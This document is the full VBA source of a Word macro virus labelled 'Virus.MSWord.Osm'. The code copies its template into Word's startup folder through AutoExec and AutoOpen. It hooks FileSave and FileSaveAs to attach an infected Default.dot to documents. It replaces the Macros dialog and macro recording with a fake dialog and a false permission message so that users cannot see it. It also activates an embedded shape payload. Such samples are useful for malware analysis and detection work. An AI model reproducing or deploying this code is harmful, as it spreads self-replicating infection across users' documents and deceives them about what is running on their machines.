   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} dlgMyMacs
      Caption         =   "Macros"
      ClientHeight    =   4215
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   6645
      OleObjectBlob   =   "Virus.MSWord.Osm-dlgMyMacs.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "dlgMyMacs"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False

   Private Sub CommandButton3_Click()
       dlgMyMacs.Hide
   End Sub

   Private Sub CommandButton4_Click()
       dlgMyMacs.Hide
   End Sub

   Private Sub CommandButton6_Click()
       MsgBox "You do not have permission to create macros on this computer.", vbOKOnly, "Microsoft Word"
   End Sub

   Attribute VB_Name = "NewMacros"
   Private Declare Function FCopy Lib "kernel32" Alias "CopyFileA" (ByVal src As String, ByVal dest As String, ByVal FailExist As Boolean) As Boolean
   Sub AutoExec()
       On Error GoTo p0p
       If FileLen(Application.StartupPath + "\Startup.dot") < 10 Then MsgBox ("1")
       Exit Sub

   p0p:
       Insert
   End Sub

   Sub AutoOpen()
   Attribute AutoOpen.VB_Description = "Macro created 03/11/98 by ITSC"
   Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.AutoOpen"
       On Error GoTo p0p
       If FileLen(Application.StartupPath + "\Startup.dot") < 10 Then MsgBox ("1")
       Exit Sub

   p0p:
       Insert
       EntryPoint
   End Sub
   Sub AutoClose()
       Application.NormalTemplate.Saved = True
   End Sub

   Sub Insert()
       On Error Resume Next
       Application.ScreenUpdating = False

       Dim src, dest As String
       dest = Application.StartupPath + "\Startup.dot"
       src = ActiveDocument.AttachedTemplate.FullName

       FCopy src, dest, False

       Application.ScreenUpdating = True

   End Sub

   Sub Copy()
       On Error Resume Next
       Dim src, dest As String
       dest = ActiveDocument.Path + "\Default.dot"
       src = Application.StartupPath + "\Startup.dot"

       Application.ScreenUpdating = False
       FCopy src, dest, False

       ActiveDocument.AttachedTemplate = dest
       ActiveDocument.Save

       Application.ScreenUpdating = True
   End Sub
   Sub FileSave()

       ActiveDocument.Save
       Copy
   End Sub
   Sub FileSaveAs()

       Dialogs(wdDialogFileSaveAs).Show
       Copy
   End Sub

   Sub ToolsMacro()
       On Error Resume Next
       Load dlgMyMacs

       dlgMyMacs.cmbIn.Clear
       dlgMyMacs.TextBox1.Text = ""
       dlgMyMacs.cmbIn.AddItem "All active templates and documents"
       dlgMyMacs.cmbIn.SelText = "All active templates and documents"
       dlgMyMacs.cmbIn.AddItem "Normal (global template)"
       dlgMyMacs.cmbIn.AddItem "Word commands"
       dlgMyMacs.cmbIn.AddItem ActiveDocument.Name + " (document)"

       dlgMyMacs.Show

   End Sub

   Sub ToolsRecordMacroToggle()
   Attribute ToolsRecordMacroToggle.VB_Description = "Turns macro recording on or off"
   Attribute ToolsRecordMacroToggle.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.ToolsRecordMacroToggle"
       MsgBox "You do not have permission to create macros on this computer.", vbOKOnly, "Microsoft Word"
   End Sub

   Sub EntryPoint()
       ThisDocument.Shapes(1).Activate
       ThisDocument.Saved = True
   End Sub

   Sub Show()
       ThisDocument.Shapes(1).Visible = msoTrue
   End Sub

   Sub Hide()
       ThisDocument.Shapes(1).Visible = msoFalse
   End Sub
